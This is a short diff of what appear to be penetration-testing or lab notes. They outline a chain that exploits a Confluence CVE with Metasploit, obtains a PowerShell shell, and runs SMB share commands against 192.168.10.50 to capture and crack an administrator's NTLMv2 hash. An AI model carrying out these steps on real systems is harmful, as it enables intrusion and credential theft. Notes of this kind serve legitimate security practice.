@@ -47,7 +47,7 @@ exploit cve on confluence with metasploit
 make rce
 shell
 powershell
-dir \\192.168.10.50\test
+dir \\192.168.10.50\test or net view \\192.168.10.50\test
 
 get ntlmv2 hash of administrator
 can crack ntlmv2 but not for pth
